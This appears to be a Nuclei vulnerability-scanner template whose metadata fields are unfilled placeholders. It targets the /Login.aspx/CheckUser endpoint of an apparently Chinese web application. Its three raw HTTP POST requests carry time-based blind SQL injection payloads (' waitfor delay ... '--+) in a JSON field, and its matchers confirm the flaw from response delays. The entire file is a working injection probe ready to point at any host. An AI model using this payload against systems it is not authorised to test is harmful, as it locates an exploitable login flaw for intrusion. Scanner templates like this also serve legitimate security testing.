id: yiyao-CheckUser-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /Login.aspx/CheckUser HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 38
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Content-Type: application/json; charset=UTF-8
        Accept: */*
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/Login.aspx
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=zymsfrg3k2crnftkugwsdidd
        Connection: close

        {"value":"' waitfor delay '0:0:3'--+"}
      - |-
        POST /Login.aspx/CheckUser HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 38
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Content-Type: application/json; charset=UTF-8
        Accept: */*
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/Login.aspx
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=zymsfrg3k2crnftkugwsdidd
        Connection: close

        {"value":"' waitfor delay '0:0:6'--+"}
      - |-
        POST /Login.aspx/CheckUser HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 38
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Content-Type: application/json; charset=UTF-8
        Accept: */*
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/Login.aspx
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=zymsfrg3k2crnftkugwsdidd
        Connection: close

        {"value":"' waitfor delay '0:0:9'--+"}
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"